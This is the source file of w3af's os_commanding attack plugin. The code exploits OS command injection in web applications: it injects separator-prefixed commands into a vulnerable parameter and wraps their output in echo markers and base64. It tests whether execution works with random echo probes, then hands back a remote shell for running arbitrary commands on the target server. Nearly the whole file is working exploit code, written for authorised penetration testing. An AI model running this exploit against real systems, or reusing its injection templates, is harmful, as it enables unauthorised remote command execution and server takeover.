'''
os_commanding.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import core.controllers.output_manager as om
import plugins.attack.payloads.shell_handler as shell_handler

from core.data.kb.exec_shell import ExecShell
from core.data.fuzzer.utils import rand_alpha

from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.exceptions import w3afException
from core.controllers.misc.common_attack_methods import CommonAttackMethods

from plugins.attack.payloads.decorators.exec_decorator import exec_debug



class ExploitStrategy(object):
    '''
    Base class for the different types of exploit strategies that this plugin
    can use to execute commands and get the results.
    '''
    def __init__(self, vuln, uri_opener):
        self._cmd_separator = vuln['separator']
        self._remote_os = vuln['os']
        self.vuln = vuln
        self.uri_opener = uri_opener
    
    def send(self, cmd):
        # Lets define the result header and footer.
        func_ref = getattr(self.uri_opener, self.vuln.get_method())
        
        exploit_dc = self.vuln.get_dc().copy()
        exploit_dc[self.vuln.get_var()] = cmd
        
        response = func_ref(self.vuln.get_url(), str(exploit_dc))
        return response
                
    def can_exploit(self):
        raise NotImplementedError
    
    def generate_command(self, command):
        raise NotImplementedError
    
    def extract_result(self, http_response):
        raise NotImplementedError

class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
    def __init__(self, vuln, uri_opener):
        ExploitStrategy.__init__(self, vuln, uri_opener)
        CommonAttackMethods.__init__(self)
        
    def can_exploit(self):
        # Define a test command:
        rand = rand_alpha(8)
        expected_output = rand + '\n'
        
        if self._remote_os == 'windows':
            command = self.generate_command('echo %s' % rand)
        else:
            command = self.generate_command('/bin/echo %s' % rand)

        # Lets define the result header and footer.
        http_response = self.send(command)
        return self._define_exact_cut(http_response.get_body(), expected_output)
        
    def generate_command(self, command):
        if self._remote_os == 'windows':
            command = '%s %s' % (self._cmd_separator, command)
        else:
            command = '%s %s' % (self._cmd_separator, command)
            
        return command
    
    def extract_result(self, http_response):
        return self._cut(http_response.get_body())

class FullPathExploitStrategy(ExploitStrategy):
    '''
    This strategy allows us to retrieve binary output from the commands we run
    without any errors. Also, it returns exactly the bytes returned by the
    command without any trailing or leading \n or any guessing on the command
    result length.
    '''
    REMOTE_CMD = "%s /bin/echo -n '%s'; %s | /usr/bin/base64 | "\
                 "/usr/bin/tr -d '\n'; /bin/echo -n '%s'"
    
    def can_exploit(self):
        rand = rand_alpha(8)
        cmd = self.generate_command('echo %s|rev' % rand)
        
        # For some reason that I don't care about, rev adds a \n to the string
        # it reverses, even when I run the echo with "-n".
        expected_output = '%s\n' % rand[::-1]
        
        http_response = self.send(cmd)
        return expected_output == self.extract_result(http_response)
        
    def generate_command(self, command):
        return self.REMOTE_CMD % (self._cmd_separator,
                                  shell_handler.SHELL_IDENTIFIER_1,
                                  command, shell_handler.SHELL_IDENTIFIER_2)
    
    def extract_result(self, http_response):
        return shell_handler.extract_result(http_response.get_body())

class CmdsInPathExploitStrategy(FullPathExploitStrategy):
    '''
    This strategy allows us to retrieve binary output from the commands we run
    without any errors. Also, it returns exactly the bytes returned by the
    command without any trailing or leading \n or any guessing on the command
    result length.
    '''
    REMOTE_CMD = "%s echo -n '%s'; %s | base64 | "\
                 "tr -d '\n'; echo -n '%s'"
                 

class os_commanding(AttackPlugin):
    '''
    Exploit OS Commanding vulnerabilities.

    @author: Andres Riancho (andres.riancho@gmail.com)
    '''
    EXPLOIT_STRATEGIES = [FullPathExploitStrategy, CmdsInPathExploitStrategy,
                          BasicExploitStrategy]
    
    def __init__(self):
        AttackPlugin.__init__(self)

    def get_attack_type(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'

    def get_kb_location(self):
        '''
        This method should return the vulnerability names (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds a
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        (attack.os_commanding) should return ['os_commanding',] in this method.
        
        If there is more than one location the implementation should return
        ['a', 'b', ..., 'n']
        '''
        return ['os_commanding',]

    def _generate_shell(self, vuln):
        '''
        @param vuln: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as
                 parameter.
        '''
        # Check if we really can execute commands on the remote server
        strategy = self._verify_vuln(vuln)
        if strategy:
            # Create the shell object
            shell_obj = OSCommandingShell(strategy, self.worker_pool)
            return shell_obj

        else:
            return None

    def _verify_vuln(self, vuln):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        for StrategyKlass in self.EXPLOIT_STRATEGIES:
            
            strategy = StrategyKlass(vuln, self._uri_opener)
            
            msg = 'Trying to exploit vuln %s using %s.'
            om.out.debug(msg % (vuln.get_id(), strategy))
            
            if strategy.can_exploit():
                om.out.debug('Success with strategy %s.' % strategy)
                return strategy
        
        om.out.debug('All strategies failed!')
        
        # No strategy can exploit this vulnerability
        return False
    
    def get_root_probability(self):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.8

    def get_long_desc(self):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits os commanding vulnerabilities and returns a remote shell.
        '''


class OSCommandingShell(ExecShell):

    def __init__(self, strategy, worker_pool):
        super(OSCommandingShell, self).__init__(strategy.vuln,
                                                strategy.uri_opener,
                                                worker_pool)

        self.strategy = strategy

    @exec_debug
    def execute(self, command):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @param command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        strategy_cmd = self.strategy.generate_command(command)
        try:
            http_response = self.strategy.send(strategy_cmd)
        except w3afException, e:
            msg = 'Error "%s" while sending command to remote host. Please '\
                  'try again.'
            return msg % e
        else:
            return self.strategy.extract_result(http_response)

    def get_name(self):
        return 'os_commanding'

